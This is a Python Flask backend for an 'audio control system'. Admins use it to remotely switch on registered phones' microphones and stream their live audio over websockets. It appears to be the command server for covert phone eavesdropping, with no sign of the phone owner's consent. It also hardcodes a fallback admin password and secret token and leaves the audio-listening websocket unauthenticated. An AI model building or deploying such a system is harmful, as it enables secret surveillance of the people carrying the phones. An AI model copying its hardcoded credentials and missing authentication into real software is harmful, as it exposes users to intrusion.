"""
Avni Audio Control System - Backend
- Multiple admins from .env
- Multiple admins can listen to same OR different devices simultaneously
- Device rename, remove
"""

import os
import json
import secrets
import threading
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_sock import Sock

# ─── Load .env if present ─────────────────────────────────────────────────────
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# ─── CONFIG ───────────────────────────────────────────────────────────────────
SECRET_TOKEN = os.environ.get('SECRET_TOKEN', 'avni_secret_2024_xyz')
PORT = int(os.environ.get('PORT', 5000))

# ─── Load admins from env: ADMIN_username=password ────────────────────────────
ADMINS = {}
for key, val in os.environ.items():
    if key.startswith('ADMIN_'):
        username = key[6:]  # strip ADMIN_ prefix
        ADMINS[username] = val

if not ADMINS:
    # fallback default
    ADMINS['admin'] = 'Rajput@143'

print(f'[+] Loaded admins: {list(ADMINS.keys())}')

# ─── STATE ────────────────────────────────────────────────────────────────────
sessions       = {}  # token -> username
devices        = {}  # device_id -> info dict
device_sockets = {}  # device_id -> phone websocket
audio_clients  = {}  # device_id -> {admin_token: websocket}  ← dict not list
lock = threading.Lock()

# ─── FLASK ────────────────────────────────────────────────────────────────────
app = Flask(__name__)
CORS(app, origins="*")
sock = Sock(app)

def check_auth(req):
    tok = req.headers.get('Authorization', '').replace('Bearer ', '')
    return tok in sessions

def get_admin(req):
    tok = req.headers.get('Authorization', '').replace('Bearer ', '')
    return sessions.get(tok, 'unknown')

def get_token(req):
    return req.headers.get('Authorization', '').replace('Bearer ', '')

@app.route('/')
def home():
    return 'Avni Backend Running 🚀'

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'running', 'devices': len(devices), 'admins': len(sessions)})

# ─── AUTH ─────────────────────────────────────────────────────────────────────
@app.route('/admin/login', methods=['POST'])
def admin_login():
    data     = request.json or {}
    username = data.get('username', '')
    password = data.get('password', '')

    if username in ADMINS and ADMINS[username] == password:
        token = secrets.token_hex(32)
        sessions[token] = username
        print(f'[+] Admin logged in: {username}')
        return jsonify({'status': 'ok', 'token': token, 'username': username})
    return jsonify({'error': 'Invalid username or password'}), 401

@app.route('/admin/logout', methods=['POST'])
def admin_logout():
    tok = get_token(request)
    if tok in sessions:
        username = sessions.pop(tok)
        print(f'[-] Admin logged out: {username}')
    return jsonify({'status': 'ok'})

@app.route('/admin/me', methods=['GET'])
def admin_me():
    if not check_auth(request):
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'username': get_admin(request)})

# ─── DEVICES ──────────────────────────────────────────────────────────────────
@app.route('/register', methods=['POST'])
def register_device():
    tok = request.headers.get('Authorization', '').replace('Bearer ', '')
    if tok != SECRET_TOKEN:
        return jsonify({'error': 'Unauthorized'}), 401

    data      = request.json or {}
    device_id = data.get('device_id')
    dev_name  = data.get('device_name', 'Unknown Phone')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400

    with lock:
        if device_id not in devices:
            friendly = f'Phone No.{len(devices)+1}'
        else:
            friendly = devices[device_id].get('friendly_name', dev_name)
        devices[device_id] = {
            'device_id':     device_id,
            'device_name':   dev_name,
            'friendly_name': friendly,
            'last_seen':     datetime.now().isoformat(),
            'streaming':     False,
            'mic_enabled':   False,
            'added_at':      devices.get(device_id, {}).get('added_at', datetime.now().isoformat()),
            'listeners':     0,
        }
    print(f'[+] Registered: {friendly}')
    return jsonify({'status': 'ok', 'device_id': device_id, 'friendly_name': friendly})

@app.route('/devices', methods=['GET'])
def list_devices():
    if check_auth(request):
        pass
    else:
        tok = request.headers.get('Authorization', '').replace('Bearer ', '')
        if tok != SECRET_TOKEN:
            tok2 = request.args.get('token', '')
            if tok2 != SECRET_TOKEN:
                return jsonify({'error': 'Unauthorized'}), 401
    return jsonify(list(devices.values()))

@app.route('/devices/<device_id>/rename', methods=['POST'])
def rename_device(device_id):
    if not check_auth(request):
        return jsonify({'error': 'Unauthorized'}), 401
    new_name = (request.json or {}).get('name', '').strip()
    if not new_name:
        return jsonify({'error': 'Name required'}), 400
    with lock:
        if device_id not in devices:
            return jsonify({'error': 'Device not found'}), 404
        devices[device_id]['friendly_name'] = new_name
    print(f'[RENAME] {device_id[:8]}... → "{new_name}" by {get_admin(request)}')
    return jsonify({'status': 'ok', 'friendly_name': new_name})

@app.route('/devices/<device_id>', methods=['DELETE'])
def remove_device(device_id):
    if not check_auth(request):
        return jsonify({'error': 'Unauthorized'}), 401
    with lock:
        if device_id not in devices:
            return jsonify({'error': 'Device not found'}), 404
        dev = devices.pop(device_id)
        ws = device_sockets.pop(device_id, None)
        if ws:
            try: ws.close()
            except: pass
        audio_clients.pop(device_id, None)
    print(f'[REMOVE] {dev["friendly_name"]} by {get_admin(request)}')
    return jsonify({'status': 'ok'})

@app.route('/command/<device_id>', methods=['POST'])
def send_command(device_id):
    if not check_auth(request):
        return jsonify({'error': 'Unauthorized'}), 401
    cmd = (request.json or {}).get('command')
    if cmd not in ('START_MIC', 'STOP_MIC'):
        return jsonify({'error': 'Invalid command'}), 400
    ws = device_sockets.get(device_id)
    if not ws:
        return jsonify({'error': 'Device not connected'}), 404
    try:
        ws.send(json.dumps({'cmd': cmd}))
        with lock:
            if device_id in devices:
                devices[device_id]['mic_enabled'] = (cmd == 'START_MIC')
        print(f'[CMD] {cmd} → {device_id[:8]}... by {get_admin(request)}')
        return jsonify({'status': 'ok', 'command': cmd})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ─── WEBSOCKET — Phone ────────────────────────────────────────────────────────
@sock.route('/ws/audio/<device_id>')
def ws_phone(ws, device_id):
    with lock:
        device_sockets[device_id] = ws
        if device_id not in devices:
            friendly = f'Phone No.{len(devices)+1}'
            devices[device_id] = {
                'device_id':     device_id,
                'device_name':   'Unknown Phone',
                'friendly_name': friendly,
                'last_seen':     datetime.now().isoformat(),
                'streaming':     False,
                'mic_enabled':   False,
                'added_at':      datetime.now().isoformat(),
                'listeners':     0,
            }
            print(f'[+] Auto-registered: {friendly}')
        devices[device_id]['last_seen'] = datetime.now().isoformat()

    print(f'[+] Phone connected: {device_id[:8]}...')
    try:
        while True:
            data = ws.receive()
            if data is None:
                break

            with lock:
                if device_id in devices:
                    devices[device_id]['last_seen'] = datetime.now().isoformat()

            # JSON control message
            if isinstance(data, str) and len(data) < 300:
                try:
                    msg = json.loads(data)
                    if 'status' in msg:
                        with lock:
                            if device_id in devices:
                                devices[device_id]['streaming'] = (msg['status'] == 'streaming')
                    continue
                except:
                    pass

            # Audio data — forward to ALL admin listeners for this device
            with lock:
                if device_id in devices:
                    devices[device_id]['streaming'] = True
                # audio_clients[device_id] is dict: token -> ws
                listeners = dict(audio_clients.get(device_id, {}))

            dead = []
            for tok, listener_ws in listeners.items():
                try:
                    listener_ws.send(data)
                except:
                    dead.append(tok)

            if dead:
                with lock:
                    for tok in dead:
                        audio_clients.get(device_id, {}).pop(tok, None)
                    if device_id in devices:
                        devices[device_id]['listeners'] = len(audio_clients.get(device_id, {}))

    except Exception as e:
        print(f'Phone WS error: {e}')
    finally:
        with lock:
            device_sockets.pop(device_id, None)
            if device_id in devices:
                devices[device_id]['streaming']   = False
                devices[device_id]['mic_enabled'] = False
                devices[device_id]['listeners']   = 0
        print(f'[-] Phone disconnected: {device_id[:8]}...')


# ─── WEBSOCKET — Admin listener ───────────────────────────────────────────────
@sock.route('/ws/listen/<device_id>')
def ws_admin(ws, device_id):
    # Get token from query param for WS auth
    admin_tok = request.args.get('token', '')
    admin_name = sessions.get(admin_tok, 'unknown')

    with lock:
        if device_id not in audio_clients:
            audio_clients[device_id] = {}
        # Each admin has unique slot by their token
        audio_clients[device_id][admin_tok] = ws
        if device_id in devices:
            devices[device_id]['listeners'] = len(audio_clients[device_id])

    print(f'[+] Admin "{admin_name}" listening: {device_id[:8]}... ({len(audio_clients[device_id])} total)')

    try:
        while True:
            msg = ws.receive()
            if msg is None:
                break
    except Exception as e:
        print(f'Admin WS error: {e}')
    finally:
        with lock:
            audio_clients.get(device_id, {}).pop(admin_tok, None)
            if device_id in devices:
                devices[device_id]['listeners'] = len(audio_clients.get(device_id, {}))
        print(f'[-] Admin "{admin_name}" stopped listening: {device_id[:8]}...')


if __name__ == '__main__':
    print('='*50)
    print('  Avni Audio Control System')
    print(f'  Port    → {PORT}')
    print(f'  Admins  → {list(ADMINS.keys())}')
    print('='*50)
    app.run(host='0.0.0.0', port=PORT, debug=False)
